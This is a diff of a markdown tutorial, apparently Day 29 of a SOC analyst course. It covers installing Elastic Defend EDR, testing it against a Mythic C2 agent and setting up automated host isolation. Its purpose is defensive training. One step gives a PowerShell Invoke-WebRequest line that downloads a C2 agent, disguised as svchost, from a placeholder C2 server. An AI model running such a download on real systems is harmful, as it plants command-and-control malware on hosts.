@@ -1,10 +1,6 @@
-# Day 29 — Setting Up Elastic Defend (EDR)
-> **MyDFIR 30-Day SOC Analyst Challenge | Day 29 of 30**  
-> 🎥 [Watch the original video](https://www.youtube.com/watch?v=Ec-Ab8TbJKs&list=PLG6KGSNK4PuBb0OjyDIdACZnb8AoNBeq6&index=30)
+## Day 29 — Setting Up Elastic Defend (EDR)
 
----
-
-## 📋 Summary
+### 📋 Summary
 
 Day 29 is the capstone of the challenge's defensive setup. Up until now, the ELK stack has been operating as a **detection and logging** platform — it watches and alerts, but does not actively stop threats. Today you add **Elastic Defend**, Elastic's native **Endpoint Detection and Response (EDR)** solution, which transforms your Windows server from a passive log source into an actively protected endpoint.
 
@@ -22,7 +18,7 @@ After installation, you'll test Elastic Defend by attempting to run your Mythic 
 
 ---
 
-## 🛠️ Prerequisites
+### 🛠️ Prerequisites
 
 | Component | Purpose |
 |-----------|---------|
@@ -40,7 +36,7 @@ After installation, you'll test Elastic Defend by attempting to run your Mythic 
 
 ---
 
-## 🧠 Background: EDR vs SIEM — What's the Difference?
+### 🧠 Background: EDR vs SIEM — What's the Difference?
 
 | | SIEM (Elastic Stack) | EDR (Elastic Defend) |
 |---|---|---|
@@ -61,9 +57,9 @@ In this challenge, both work together: Elastic Defend **catches and stops** the 
 
 ---
 
-## 🔧 Part 1 — Installing Elastic Defend
+### 🔧 Part 1 — Installing Elastic Defend
 
-### Step 1: Navigate to Integrations
+#### Step 1: Navigate to Integrations
 
 1. Log in to **Kibana**.
 2. Click the **hamburger menu (☰)** in the top-left corner.
@@ -72,7 +68,7 @@ In this challenge, both work together: Elastic Defend **catches and stops** the 
 
 ---
 
-### Step 2: Find and Add Elastic Defend
+#### Step 2: Find and Add Elastic Defend
 
 1. In the Integrations search bar, type `Elastic Defend`.
 2. Click on the **Elastic Defend** tile.
@@ -80,7 +76,7 @@ In this challenge, both work together: Elastic Defend **catches and stops** the 
 
 ---
 
-### Step 3: Configure the Integration
+#### Step 3: Configure the Integration
 
 You'll be presented with a configuration form. Fill it in as follows:
 
@@ -107,7 +103,7 @@ Elastic Defend EDR for Windows Server endpoint protection
 
 ---
 
-### Step 4: Attach to Your Windows Agent Policy
+#### Step 4: Attach to Your Windows Agent Policy
 
 1. Under **"Where to add this integration"**, select **Existing hosts**.
 2. From the policy dropdown, choose your **Windows Policy** (the one your Windows Server's Elastic Agent is enrolled in).
@@ -119,7 +115,7 @@ Elastic will push the Elastic Defend integration to your Windows Server automati
 
 ---
 
-### Step 5: Verify the Deployment
+#### Step 5: Verify the Deployment
 
 1. In Kibana, click the **hamburger menu (☰)**.
 2. Under **Security**, click **Manage**.
@@ -145,11 +141,11 @@ Clicking the **Actions** dropdown next to your endpoint reveals:
 
 ---
 
-## 🧪 Part 2 — Testing Elastic Defend: Malware Detection
+### 🧪 Part 2 — Testing Elastic Defend: Malware Detection
 
 Now that Elastic Defend is active, test it by attempting to run the Mythic C2 agent binary on the Windows Server. The EDR should detect and block it immediately.
 
-### Step 1: Attempt to Run the Mythic Agent
+#### Step 1: Attempt to Run the Mythic Agent
 
 On your Windows Server:
 
@@ -162,7 +158,7 @@ On your Windows Server:
 
 ---
 
-### Step 2: Review the Malware Alert in Kibana — Discover
+#### Step 2: Review the Malware Alert in Kibana — Discover
 
 1. In Kibana, go to **Analytics → Discover**.
 2. In the KQL search bar, type:
@@ -188,7 +184,7 @@ On your Windows Server:
 
 ---
 
-### Step 3: Review the Malware Alert in Kibana — Security Alerts
+#### Step 3: Review the Malware Alert in Kibana — Security Alerts
 
 1. In Kibana, go to **Security → Alerts**.
 2. Look for a **Malware Prevention Alert** — it will have a distinct orange or red severity badge.
@@ -204,13 +200,13 @@ What you'll see in the alert detail view:
 
 ---
 
-## ⚡ Part 3 — Configuring Automated Host Isolation
+### ⚡ Part 3 — Configuring Automated Host Isolation
 
 Rather than requiring an analyst to manually isolate a host after a malware alert, you can configure the detection rule to **automatically isolate the endpoint** the moment the alert fires. This is a core incident response automation capability.
 
 > ⚠️ **Trial/Paid tier required.** Automated host isolation via Response Actions requires Elastic's trial or paid subscription. Free-tier users can configure the rule but the isolation action will not execute.
 
-### Step 1: Find the Malware Detection Rule
+#### Step 1: Find the Malware Detection Rule
 
 1. In Kibana, go to **Security → Rules → Detection Rules (SIEM)**.
 2. Search for the Windows malware rule. It will be named something like:
@@ -221,7 +217,7 @@ Rather than requiring an analyst to manually isolate a host after a malware aler
 
 ---
 
-### Step 2: Add an Automated Response Action
+#### Step 2: Add an Automated Response Action
 
 1. In the rule settings, navigate to the **Response Actions** tab.
 2. Click **Add response action**.
@@ -237,11 +233,11 @@ The rule will now automatically trigger host isolation on any endpoint that gene
 
 ---
 
-## 🧪 Part 4 — Verifying Automated Isolation End-to-End
+### 🧪 Part 4 — Verifying Automated Isolation End-to-End
 
 With the automated isolation response action configured, perform a live test to confirm the full detection → isolation chain works.
 
-### Step 1: Confirm Network Connectivity (Baseline)
+#### Step 1: Confirm Network Connectivity (Baseline)
 
 On the Windows Server, open **Command Prompt** and run a continuous ping to confirm network is currently up:
 
@@ -253,7 +249,7 @@ You should see replies coming in. **Leave this running** — it's your indicator
 
 ---
 
-### Step 2: Attempt to Download a Fresh C2 Agent
+#### Step 2: Attempt to Download a Fresh C2 Agent
 
 On the Windows Server, open **PowerShell** and use Invoke-WebRequest to download the Mythic agent from your C2 server's HTTP listener:
 
@@ -273,7 +269,7 @@ Invoke-WebRequest -Uri "http://<Mythic-server-IP>:<port>/svchost-[name].exe" -Ou
 
 ---
 
-### Step 3: Confirm Isolation in Kibana
+#### Step 3: Confirm Isolation in Kibana
 
 1. Go to **Security → Manage → Endpoints**.
 2. Your Windows Server should now show an **Isolated** status badge.
@@ -283,7 +279,7 @@ Invoke-WebRequest -Uri "http://<Mythic-server-IP>:<port>/svchost-[name].exe" -Ou
 
 ---
 
-### Step 4: Release the Host
+#### Step 4: Release the Host
 
 1. On the Endpoints page, click **Actions** next to your Windows Server.
 2. Click **Release host**.
@@ -297,7 +293,7 @@ Your `ping 8.8.8.8 -t` in Command Prompt should resume receiving replies within 
 
 ---
 
-## 📊 What Elastic Defend Telemetry Looks Like
+### 📊 What Elastic Defend Telemetry Looks Like
 
 After the test, you can query the raw Elastic Defend telemetry in Kibana Discover:
 
@@ -317,7 +313,7 @@ This returns all events generated by Elastic Defend. Useful sub-queries:
 
 ---
 
-## ✅ Summary of Key Takeaways
+### ✅ Summary of Key Takeaways
 
 | Topic | Key Point |
 |-------|-----------|
@@ -335,7 +331,7 @@ This returns all events generated by Elastic Defend. Useful sub-queries:
 
 ---
 
-## 🔄 How Elastic Defend Fits Into the Full SOC Architecture
+### 🔄 How Elastic Defend Fits Into the Full SOC Architecture
 
 ```
 Attacker attempts to run Mythic C2 agent on Windows Server
@@ -362,17 +358,13 @@ Attacker attempts to run Mythic C2 agent on Windows Server
 
 ---
 
-## 🔗 Resources
+### 🔗 Resources
 
-- 📺 [Original Video — MyDFIR Day 29](https://www.youtube.com/watch?v=Ec-Ab8TbJKs)
-- 📺 [Day 28 — Investigating Mythic C2 Agent](https://www.youtube.com/watch?v=b11TuDx_CjU) *(prerequisite)*
 - 📖 [Elastic Defend Official Documentation](https://www.elastic.co/docs/solutions/security/get-started/get-started-endpoint-security)
 - 📖 [Elastic Defend — Automated Response Actions](https://www.elastic.co/guide/en/security/current/automated-response-actions.html)
 - 📖 [Elastic Defend — Host Isolation](https://www.elastic.co/guide/en/security/current/host-isolation-ov.html)
 - 📖 [Elastic Endpoint Response Actions Reference](https://www.elastic.co/guide/en/security/current/response-actions.html)
 - 🔎 [VirusTotal — File Hash Lookup](https://www.virustotal.com)
-- 🌐 [MyDFIR SOC Community](https://www.skool.com/mydfir)
-
 ---
 
 > *Part of the MyDFIR 30-Day SOC Analyst Challenge. This tutorial is based on Day 29 content and is intended for educational purposes only. Elastic Defend and C2 tools should only be used in authorized lab environments.*
